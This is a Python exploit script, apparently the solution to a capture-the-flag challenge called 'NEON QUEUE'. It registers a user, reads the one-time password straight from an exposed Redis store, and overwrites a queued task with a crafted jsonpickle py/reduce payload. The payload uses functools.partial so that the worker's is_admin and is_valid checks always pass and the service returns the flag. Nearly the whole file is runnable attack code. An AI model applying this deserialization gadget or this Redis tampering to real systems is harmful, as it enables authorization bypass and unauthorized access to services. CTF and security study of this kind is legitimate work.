#!/usr/bin/env python3
"""
NEON QUEUE - Exploit Method 1: py/reduce with functools.partial

This exploit bypasses the is_admin() and is_valid() checks by creating
objects where these attributes are CALLABLE functions that return True.

Uses:
- types.SimpleNamespace: Standard library class for objects with attributes
- functools.partial(bool, 1): Creates a callable that returns True

This is the "intended" harder solution that requires understanding
jsonpickle's py/reduce feature.
"""

import sys
import json
import base64
import zlib
import time
import redis
import requests
from typing import Optional


TARGET = sys.argv[1] if len(sys.argv) > 1 else "localhost"
REDIS_HOST = TARGET
REDIS_PORT = 6379
API_URL = f"http://{TARGET}:8000"


def create_evil_payload() -> str:
    """
    Create payload using py/reduce with functools.partial.
    
    The worker calls meta.is_admin() and approval.is_valid().
    We make these attributes callable functions that return True.
    """
    
    evil_payload = {
        "py/object": "types.SimpleNamespace",
        "py/state": {
            "type": "get_flag",
            "params": {},
            "meta": {
                "py/object": "types.SimpleNamespace",
                "py/state": {
                    "role": "admin",
                    "source": "exploit",
                    "validated": True,
                    # functools.partial(bool, 1) returns True when called
                    "is_admin": {
                        "py/reduce": [
                            {"py/function": "functools.partial"},
                            {"py/tuple": [
                                {"py/function": "builtins.bool"},
                                1
                            ]}
                        ]
                    }
                }
            },
            "approval": {
                "py/object": "types.SimpleNamespace",
                "py/state": {
                    "approved": True,
                    "approver": "system",
                    "timestamp": "2024-01-01",
                    # functools.partial(bool, 1) returns True when called
                    "is_valid": {
                        "py/reduce": [
                            {"py/function": "functools.partial"},
                            {"py/tuple": [
                                {"py/function": "builtins.bool"},
                                1
                            ]}
                        ]
                    }
                }
            }
        }
    }
    
    json_str = json.dumps(evil_payload)
    print(f"[*] Evil payload (py/reduce + functools.partial):")
    print(json.dumps(evil_payload, indent=2))
    print()
    
    compressed = zlib.compress(json_str.encode('utf-8'))
    return base64.b64encode(compressed).decode('ascii')


def main():
    print("=" * 60)
    print(" NEON QUEUE EXPLOIT")
    print(" Method 1: py/reduce with functools.partial")
    print("=" * 60)
    
    r = redis.Redis(host=REDIS_HOST, port=REDIS_PORT, decode_responses=True)
    
    try:
        r.ping()
        print(f"\n[+] Connected to Redis at {REDIS_HOST}:{REDIS_PORT}")
    except:
        print(f"[-] Failed to connect to Redis")
        return
    
    # Register user
    import random
    suffix = random.randint(1000, 9999)
    username = f"hacker{suffix}"
    email = f"hacker{suffix}@gmail.com"
    
    print(f"\n[*] Registering user '{username}'...")
    resp = requests.post(f"{API_URL}/auth/register", json={
        "username": username,
        "email": email,
        "password": "exploit123"
    })
    if not resp.ok:
        print(f"[-] Registration failed: {resp.text}")
        return
    user_id = resp.json().get("user_id")
    print(f"[+] User ID: {user_id}")
    
    # Get OTP from Redis
    print("\n[*] Retrieving OTP from Redis...")
    time.sleep(0.5)
    otp = r.get(f"otp:{user_id}")
    if not otp:
        print("[-] OTP not found")
        return
    print(f"[+] OTP: {otp}")
    
    # Verify OTP
    print("\n[*] Verifying OTP...")
    resp = requests.post(f"{API_URL}/auth/verify-otp", json={
        "user_id": user_id,
        "otp": otp
    })
    if not resp.ok:
        print(f"[-] Verification failed: {resp.text}")
        return
    token = resp.json().get("access_token")
    print("[+] Account verified")
    
    # Submit decoy task
    print("\n[*] Submitting decoy task...")
    resp = requests.post(
        f"{API_URL}/tasks",
        headers={"Authorization": f"Bearer {token}"},
        json={"task_type": "system_status"}
    )
    if not resp.ok:
        print(f"[-] Task creation failed: {resp.text}")
        return
    task_id = resp.json().get("task_id")
    print(f"[+] Task ID: {task_id}")
    
    # Create and inject evil payload
    print("\n[*] Creating evil payload...")
    evil_payload = create_evil_payload()
    
    print("[*] Injecting payload into Redis...")
    r.set(f"task:{task_id}", evil_payload)
    print("[+] Payload injected!")
    
    # Wait for worker
    print("\n[*] Waiting for worker to process...")
    result = None
    for i in range(15):
        time.sleep(1)
        resp = requests.get(
            f"{API_URL}/tasks/{task_id}",
            headers={"Authorization": f"Bearer {token}"}
        )
        result = resp.json()
        if result.get("status") == "completed":
            break
        print(f"[.] Waiting... ({i+1}/15)")
    
    # Show result
    print("\n" + "=" * 60)
    output = result.get("output", "N/A")
    print(f" OUTPUT: {output}")
    print("=" * 60)
    
    if "BUETCTF{" in output or "FLAG{" in output:
        print("\n[+] SUCCESS! Flag captured via logic bypass!")
    elif "ACCESS DENIED" in output:
        print("\n[-] Access denied - exploit may need adjustment")
    else:
        print(f"\n[?] Unexpected result")


if __name__ == "__main__":
    main()
